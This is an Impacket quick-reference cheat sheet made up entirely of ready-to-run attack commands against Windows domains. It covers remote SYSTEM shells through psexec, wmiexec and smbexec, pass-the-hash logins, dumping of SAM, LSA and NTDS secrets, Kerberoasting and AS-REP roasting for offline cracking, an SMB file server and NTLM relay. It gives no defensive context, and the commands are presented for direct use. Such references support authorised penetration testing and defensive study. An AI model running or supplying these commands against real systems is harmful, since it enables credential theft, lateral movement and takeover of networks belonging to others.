# Impacket Quick Reference

## Remote Execution

```bash
impacket-psexec domain/admin:pass@TARGET              # SYSTEM shell
impacket-psexec domain/admin@TARGET -hashes LM:NTLM   # pass the hash
impacket-wmiexec domain/admin:pass@TARGET              # admin shell (quieter)
impacket-smbexec domain/admin:pass@TARGET              # SYSTEM shell (alt)
```

## Credential Dumping

```bash
impacket-secretsdump domain/admin:pass@TARGET          # SAM + LSA + NTDS
impacket-secretsdump domain/admin@TARGET -hashes LM:NTLM
```

## Kerberos Attacks

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request           # Kerberoast
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC -format hashcat  # AS-REP
```

## Database

```bash
impacket-mssqlclient user:pass@TARGET
impacket-mssqlclient user:pass@TARGET -windows-auth
```

## SMB Server

```bash
impacket-smbserver share . -smb2support                # serve files
impacket-smbserver share . -smb2support -user u -password p  # with auth
```

## NTLM Relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```
